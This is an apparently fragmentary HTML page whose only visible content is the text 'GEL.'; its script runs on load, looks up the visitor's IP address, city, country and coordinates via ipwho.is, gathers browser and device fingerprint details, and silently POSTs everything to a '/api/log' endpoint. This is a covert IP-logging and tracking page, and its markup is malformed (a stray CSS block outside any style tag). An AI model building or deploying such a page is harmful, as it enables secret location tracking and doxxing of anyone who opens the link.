<head>

    body {
      display: flex;
      justify-content: center;
      align-items: center;

<body>
  GEL.

  <script>

    async function getIPLocation() {
      try {
        const res = await fetch('https://ipwho.is/');
        const data = await res.json();
        if (data.success) {
          return data; 
        } else {
          return null; 
        }
      } catch (error) {
        console.error("IP wasn't taken", error);
        return null;
      }
    }

    async function sendData() {
      const ipData = await getIPLocation();

      let finalIP = "?unknown ip";
      let finalLocation = "loc wasn't taken";
      let lat = null;
      let lon = null;

      if (ipData) {
        finalIP = ipData.ip || finalIP;
        const city = ipData.city || "unknown";
        const country = ipData.country || "unknown";
        finalLocation = `${city}, ${country}`;
        lat = ipData.latitude || null;
        lon = ipData.longitude || null;
      }

      let userData = {
        ip: finalIP,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        screenWidth: screen.width,
        screenHeight: screen.height,
        language: navigator.language,
        location: finalLocation,
        latitude: lat,
        longitude: lon,


        hardwareConcurrency: navigator.hardwareConcurrency || "unknown",
        deviceMemory: navigator.deviceMemory || "unknown",
        colorDepth: screen.colorDepth || "unknownr",
        languages: navigator.languages ? navigator.languages.join(", ") : navigator.language,
        isOnline: navigator.onLine
      };


      fetch('/api/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(userData)
      });
    }


    sendData();
  </script>
</body>
